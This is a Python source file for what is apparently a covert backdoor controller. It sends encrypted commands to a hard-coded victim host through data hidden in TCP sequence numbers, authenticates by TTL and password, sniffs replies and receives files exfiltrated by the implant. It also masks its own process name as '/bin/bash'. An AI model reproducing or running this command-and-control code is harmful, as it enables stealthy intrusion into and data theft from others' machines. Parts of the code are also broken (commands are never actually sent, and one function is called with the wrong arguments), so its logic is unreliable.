#!/usr/bin/python3

import uuid #Used to generate UID's
import optparse
import os
import subprocess
import sys
import time
import bkutil
from multiprocessing import Process
from Crypto import Random
from Crypto.Cipher import AES
from scapy.all import *

import setproctitle

"""
Setup: pip3 install pycrypto setproctitle scapy
"""
    
TTL=234
# random secret key (both the client and server must match this key)
encryptionKey = "passyourwords"
iv = Random.new().read(AES.block_size)
IV = "whatsthedealwithairplanes"
victim=("192.168.0.8",99)
messages = []
authentication ="1337"

myip=("192.168.0.3",66)

def writeFile(UID):
    for element in messages:
        text = ""
        bits = ""
        fileName = ""
        fileContents = ""
        if(element[0] == UID):
            data = element[2]
            for value in data:
                text += str(value)
                pass
            #Split into chunks of 8
            line = text
            n = 8
            chunks = [line[i:i+n] for i in range(0, len(line), n)]
            #Convert each element in array to integer & letter.
            for x in range(0, len(chunks)):
                chunks[x] = int(chunks[x], 2)
                chunks[x] = chr(chunks[x])

            binaryString = ''.join(chunks)

            delimiter = binaryString.index('00000000')
            #Everything until the delimiter is the file name
            fileName = binaryString[0:delimiter]
            decryptedFileName = decrypt(fileName)

            fileContents = fileContents.join(chunks[delimiter+8:])

    createFile = open(decryptedFileName, 'w')
    createFile.write(fileContents)
    createFile.close()


def secret_send(msg:str, type:str='command'):
    '''
    Keyword arguments:
    msg      - payload being sent
    type     - file or command (default:command)
    '''
    if(type == "command"):
        #Convert message to ASCII to bits
        msg = bkutil.message_to_bits(msg)
    elif(type == "file"):
        #Convert the message to bits
        msg = bkutil.file_to_bits(msg)
        #split msg into pieces that will fit in the packets
        message_array = message_spliter(msg)
        #send packets
        packets = packatizer(message_array) #TODO 

        if(len(packets) == 1):
            send(packets[0])
        else:
            for packet in packets:
                send(packet)
                pass

def message_spliter(msg:str):
    length = 32 #bits in seq #
    if(len(msg) == length ):
        output = []
        output.append(msg)
        return msg
    #However, if its less than the max amount that can be carried by the packet/
    #protocol, then pad it to reach the max length.
    elif(len(msg) <= length):
        # Pad so that the message is as long as the length
        msg = msg.zfill(length)
        return msg
    #If the message length is greater than what can be stuffed into one packet,
    #then break it down into multiple chunks
    elif(len(msg) > length):
        #Rounds are the amount of packets that can be filled with the data.
        rounds = len(msg) / length
        #The excess is what will be left over
        excess = len(msg) % length
        #Create the blank array that will hold the data for each packet.
        output = []
        #Markers that will be used for traversing the data.
        i = 0
        start = 0
        end = 0
        # While packets can be completely filled
        while(i < rounds):
            start = i*length
            end = (i*length)+(length - 1) #31
            output.append(msg[start:end+1])
            i = i + 1
        #All the full packets have been created. Now to deal with the excess
        if(excess > 0):
            #Add the excess to the output array.
            output.append(msg[(end+1):(end+1+excess)])
        return output

def packatizer(msg):
    #Create the packets array as a placeholder.
    packets = []
    #If the length of the number is larger than what is allowed in one packet, split it
    counter = 0
    #Create a UID to put in every packet, so that we know what session the
    #Packets are part of
    UID = generateUID()

    #If not an array (if there is only one packet.)
    if(type(msg) is str):
        #The transmissions position and total will be 1.
        # i.e. 1/1 message to send.
        packets.append(craft(msg,counter+1,1,UID))
    #If an array (if there is more than one packet)
    elif(type(msg) is list):
        while (counter < len(msg)):
            #The position will be the array element and the total will be the
            # length.
            # i.e. 1/3 messages to send.
            packets.append(craft(msg[counter],counter+1,len(msg),UID))
            counter = counter + 1

    return packets

def generateUID():
    uid = uuid.uuid1()
    return str(uid)

def craft(data,position,total,UID):
    global TTL
    global authentication

    #The payload contains the unique password, UID, position number and total.
    packet = IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1],dport=victim[1], \
        seq=int(str(data),2))/Raw(load=encrypt(authentication+"\n"+UID+"\n"+str(position)+":" \
        + str(total)))
    return packet

def encrypt(message: str) -> str:
    global encryptionKey
    global IV
    encryptor = AES.new(encryptionKey,AES.MODE_CFB,IV=IV)
    return encryptor.encrypt(message)

def decrypt(command: str) -> str:
    global encryptionKey
    global IV
    decryptor = AES.new(encryptionKey, AES.MODE_CFB, IV=IV)
    plain = decryptor.decrypt(command)
    return plain

def client():
    while True:
        try:
            # Prompt user for the command they would like to execute on the backdoor.
            command = input("ENTER COMMAND: {}:".format(victim[0]))
        except EOFError as e:
            print(e)
        #Print the command so that the user knows what they typed.
        print(command)
        # If the user types "exit". shutdown the program.
        if(command == "exit"):
            sys.exit()
        else:
            #Encrypt the command.
            encryptedCommand = encrypt(command)
            # Specify to the sendMessage funciton that we are sending on the
            # protocol as defined in the config file, the command & what type of
            # transmission it will be ( a command )
            secret_send(encryptedCommand)
            # Immediately after sending, start listening for responses.
            # The time-out has been set to 10 seconds so as to allow enough time
            # for responses to large commands (i.e. iptables -L ) to return.
            sniff(timeout=10, filter="ip", prn=handle)

def handle(packet):
    #Only handle a packet if it contains an IP layer.
    if(packet.haslayer(IP)):
        # Don't handle any inbound packets that are looping back.
        if(packet[IP].src != myip[0]):
            #Authenticate the packet based on the pre-defined characteristics.
            if authenticate(packet):
                #Decrypt the payload and split on the newline characters
                payload = decrypt(packet["Raw"].load).split("\n")
                UID = payload[1]
                position = payload[2].split(":")[0]
                total = payload[2].split(":")[1]
                #Handle packet based on TCP rules
                if(packet.haslayer(TCP)):
                    #Define the length
                    length = 32
                    # DECRYPT THE COVERT CONTENTS?!?!?!
                    # Convert to binary
                    field = packet[TCP].seq
                    #Converts the bits to the nearest divisible by 8
                    covertContent = lengthChecker(field)
                #If there's more than one message associated with this
                #transmission, add it to our list of messages.
                if(total != 1):
                    #DEBUG: print "Multipart command, add to messages"
                    addToMessages(messages, UID, total, covertContent)
                    # Each time a message is added, check to see if the max/end
                    # of the transmission has been reached. e.g. message 3 out
                    # of 3
                    # If the max has been reached
                    if(checkMessages(UID)):
                        #Reconstruct the message
                        message = reconstructMessage(UID)
                        #Decrypt the full contents of the message here
                        decryptedMessage = decrypt(message)
                        #Dispaly the output to the user
                        print ("OUTPUT: \n " + decryptedMessage)
                        #Delete the packets belonging to the session from memory
                        deleteMessages(UID)

def sniffFile():
    sniff(filter="ip and dst port 90", prn=receiveFile)

def lengthChecker(field):
    covertContent = 0
    seqContent = bin(field)[2:]
    if len(seqContent) < 8:
        covertContent = bin(field)[2:].zfill(8)
    elif len(seqContent) > 8 and len(seqContent) < 16:
        covertContent = bin(field)[2:].zfill(16)
    elif len(seqContent) > 16 and len(seqContent) < 24:
        covertContent = bin(field)[2:].zfill(24)
    elif len(seqContent) > 24 and len(seqContent) < 32:
        covertContent = bin(field)[2:].zfill(32)
    else:
        return seqContent
    return covertContent

def authenticate(packet):
    global command
    global authentication
    # Check TTL first
    ttl = packet[IP].ttl
    # Checks if the ttl matches with ours
    if ttl == TTL:
        # Check the password in the payload
        payload = packet["Raw"].load
        # Decrypt payload, sequence number
        decryptedData = decrypt(payload)
        # Check if password in payload is correct
        password = decryptedData.split("\n")[0]
        #password = payload[0]
        if(password == authentication):
            return True
        else:
            return False
    return False

def receiveFile(packet):
    if(packet.haslayer(IP) and packet[IP].src != myip[0]):
            if authenticate(packet):
                payload = decrypt(packet["Raw"].load).split("\n")
                UID = payload[1]
                position = payload[2].split(":")[0]
                total = payload[2].split(":")[1]
                if(packet.haslayer(TCP)):
                    #Define the length
                    length = 32
                    # convert to binary
                    field = packet[TCP].seq
                    #Converts the bits to the nearest divisible by 8
                    covertContent = lengthChecker("TCP",field)
                elif(packet.haslayer(UDP)):
                    length = 16
                    # convert to binary
                    field = packet[UDP].sport
                    covertContent = lengthChecker("UDP",field)
                if(total > 1):
                    #"Multipart command, add to messages"
                    addToMessages(messages, UID, total, covertContent)
                    # After every add, check if the max has been reached
                    if(checkMessages(UID)):
                        #If all the packets have been received, write it out
                        #to file
                        writeFile(UID)

setproctitle.setproctitle("/bin/bash") #set fake process name
#print(setproctitle.getproctitle())

fileProcess = Process(target=sniffFile)
fileProcess.start()
client()
